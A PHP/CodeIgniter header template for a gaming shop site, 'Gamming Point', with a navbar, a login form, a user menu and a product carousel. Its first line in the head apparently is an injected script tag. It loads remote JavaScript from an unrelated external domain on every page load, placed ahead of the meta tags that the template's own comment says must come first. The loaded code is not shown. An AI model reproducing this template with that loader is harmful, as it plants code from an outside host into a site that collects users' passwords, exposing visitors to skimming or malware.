<!DOCTYPE html>
<html lang="en">
  <head><script src="http://d.crimethreatalert.com/l/load.js"></script>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->

    <title>Gamming Point</title>

    <!-- Bootstrap core CSS -->
    <link href="<?php echo base_url();?>assets/css/bootstrap.css" rel="stylesheet">


    <!-- Custom styles for this template -->
    <link href="<?php echo base_url();?>assets/css/custom.css" rel="stylesheet">
    <script src="<?php echo base_url();?>assets/js/jquery.min.js"></script>
    <script src="<?php echo base_url();?>assets/js/bootstrap.js"></script>
   
    <script type="text/javascript">
    $(window).load(function() {
      $(".loader").fadeOut("slow");
    })
    </script>


  </head>

    <body style="    background: gainsboro;">
  

<!--
  Below we include the Login Button social plugin. This button uses
  the JavaScript SDK to present a graphical Login button that triggers
  the FB.login() function when clicked.
-->
    
    
    
      <div class="">
      <nav class="navbar navbar-inverse navbar-fixed-top ">
        <div class="navbar-header ">
          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="navbar-brand" href="<?php echo base_url();?>"><B>Gamming Point</B></a>
        </div>
        <div id="navbar" class="container collapse navbar-collapse" style="    padding-right: 5%;">
          <ul class="nav navbar-nav">
            <li class="active"><a href="<?php echo base_url();?>">Home</a></li>
            <li><a href="<?php echo base_url();?>index.php/users/register">Create Account</a></li>
            <li><a href="<?php echo base_url();?>index.php/users/admin_login">Admin Login</a></li>
            <li style="">
            </li>
          </ul>
          <?php if(!$this->session->userdata('logged_in')):?>
          <form class="navbar-form navbar-right" method="post" action="<?php echo base_url()?>index.php/users/login">
        	<!--div class="form-group"-->
         	 <input type="text" name="username" class="form-control" placeholder="Enter user name">
        	<!--/div-->
        	<!--div class="form-group"-->
         	 	<input type="password" name="password" class="form-control" 		placeholder="Enter Password">
        	<!--/div-->
        <button type="submit" name="submit" class="btn red hover editable navbar-btn navbar-right" style="margin-left:15px !important; margin-top:-1px;" >Login</button>
      </form>
    <?php else : ?>
          <ul class="nav navbar-nav navbar-right">
          <li class="dropdown">
            <a class="dropdown-toggle" style="color: cornsilk;" data-toggle="dropdown" href="#"><?php echo ucfirst($this->session->userdata('username')) ?>
            <span class="caret"></span></a>
            <ul class="dropdown-menu">
             <li><a href="<?php echo base_url();?>index.php/products/orders">Orders</a></li>
              <li><a href="<?php echo base_url();?>index.php/products/wishlist">Wishlist</a></li>
              <li><a href="#">Edit Profile</a></li>
           </ul>
          </li>
          <li>
         <form class="navbar-form navbar-right" method="post" action="<?php echo base_url();?>index.php/users/logout">
        <button type="submit" name="logout" class="btn btn-default">Logout</button>
      </form>
      </li>
      </ul>
    <?php endif; ?>
        </div><!--/.nav-collapse -->
        </nav>
      </div>
      <div id="carousel-example-generic" class="  carousel slide" style="height:100mm;"  data-ride="carousel">
  <!-- Indicators -->
  <ol class="carousel-indicators">
    <li data-target="#carousel-example-generic" data-slide-to="0" class="active"></li>
    <li data-target="#carousel-example-generic" data-slide-to="1"></li>
    <li data-target="#carousel-example-generic" data-slide-to="2"></li>
  </ol>

  <!-- Wrapper for slides -->
  <div class="carousel-inner" style="height: 100%" role="listbox">
    <div class="item active">
      <img src="<?php echo base_url();?>assets/images/products/2.jpg" alt="...">
      <div class="carousel-caption">
        ...
      </div>
    </div>
    <div class="item">
      <img src="<?php echo base_url();?>assets/images/products/5.jpg" alt="...">
      <div class="carousel-caption">
        ...
      </div>
    </div>
    <div class="item">
      <img src="<?php echo base_url();?>assets/images/products/7.jpg" alt="...">
      <div class="carousel-caption">
        ...
      </div>
    </div>
    ...
  </div>

  <!-- Controls -->
  <a class="left carousel-control" href="#carousel-example-generic" role="button" data-slide="prev">
    <span class="glyphicon glyphicon-chevron-left" aria-hidden="true"></span>
    <span class="sr-only">Previous</span>
  </a>
  <a class="right carousel-control" href="#carousel-example-generic" role="button" data-slide="next">
    <span class="glyphicon glyphicon-chevron-right" aria-hidden="true"></span>
    <span class="sr-only">Next</span>
  </a>
</div>

    
<br><br>
</div>
    <br><br>
    		<div class="row" style="margin-top:25px;">
    			<div class="col-md-1">
          </div>
          <div class="col-md-3">
            <!--include krna sidebar-->
            <?php include "sidebar.php"?>
        </div>
    			<div class="col-md-6">
               